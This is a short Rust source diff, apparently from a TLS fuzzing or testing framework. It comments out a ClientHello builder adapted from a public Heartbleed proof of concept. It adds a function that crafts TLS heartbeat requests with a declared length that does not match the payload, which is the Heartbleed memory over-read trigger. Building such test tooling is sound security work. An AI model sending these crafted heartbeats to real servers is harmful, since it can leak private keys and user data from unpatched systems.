@@ -82,7 +82,7 @@ pub fn fn_application_data(data: &Vec<u8>) -> Result<Message, FnError> {
 
 // Adapted from https://github.com/mpgn/heartbleed-PoC/blob/master/heartbleed-exploit.py
 // unused right now
-pub fn fn_heartbeat_ch() -> Result<Message, FnError> {
+/*pub fn fn_heartbeat_ch() -> Result<Message, FnError> {
     let hello_client_hex = "
         16 03 03 00  dc 01 00 00 d8 03 03 53
         43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
@@ -110,18 +110,21 @@ pub fn fn_heartbeat_ch() -> Result<Message, FnError> {
     Ok(Message::try_from(OpaqueMessage::read(&mut Reader::init(
         hello_client.as_slice(),
     ))?)?)
-}
+}*/
 
-// todo
-pub fn fn_heartbeat() -> Result<Message, FnError> {
+pub fn fn_heartbeat_fake_length(payload: &Vec<u8>, fake_length: &u16) -> Result<Message, FnError> {
     Ok(Message {
         version: ProtocolVersion::TLSv1_2,
         payload: MessagePayload::Heartbeat(HeartbeatPayload {
             typ: HeartbeatMessageType::Request,
-            payload: PayloadU16::new(vec![]),
-            fake_length: Some(16702),
+            payload: PayloadU16::new(payload.clone()),
+            fake_length: Some(*fake_length),
         }),
     })
+}
+
+pub fn fn_heartbeat(payload: &Vec<u8>) -> Result<Message, FnError> {
+    fn_heartbeat_fake_length(payload, &(payload.len() as u16))
 }
 
 // ----
